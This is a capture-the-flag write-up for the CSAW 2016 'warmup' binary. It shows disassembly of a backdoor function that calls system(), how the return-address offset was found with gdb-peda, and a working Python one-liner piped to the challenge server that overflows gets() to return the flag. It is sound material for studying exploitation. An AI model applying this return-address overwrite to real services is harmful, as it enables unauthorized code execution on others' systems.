# Warmup

There is a backdoor in the binary and the address is even printed after it starts:
```
$ objdump -M intel -d warmup | grep "<easy>" -A 6
000000000040060d <easy>:
  40060d:	55                   	push   rbp
  40060e:	48 89 e5             	mov    rbp,rsp
  400611:	bf 34 07 40 00       	mov    edi,0x400734
  400616:	e8 b5 fe ff ff       	call   4004d0 <system@plt>
  40061b:	5d                   	pop    rbp
  40061c:	c3                   	ret
```

Trivial buffer overflow:
```
$ gdb -q ./warmup
Reading symbols from ./warmup...(no debugging symbols found)...done.
```

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

```
gdb-peda$ r
Starting program: /root/warmup
-Warm Up-
WOW:0x40060d
>AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

   0x40069e <main+129>:	call   0x400500 <gets@plt>
   0x4006a3 <main+134>:	leave
=> 0x4006a4 <main+135>:	ret

Stopped reason: SIGSEGV
0x00000000004006a4 in main ()
```

```
gdb-peda$ x /gx $rsp
0x7fffffffe878:	0x4134414165414149
```

```
gdb-peda$ pattern offset 0x4134414165414149
4698452060381725001 found at offset: 72
```

```
$ python -c 'from struct import pack as p; print "A" * 72 + p("Q", 0x40060d)' | nc pwn.chal.csaw.io 8000
-Warm Up-
WOW:0x40060d
>FLAG{LET_US_BEGIN_CSAW_2016}
```
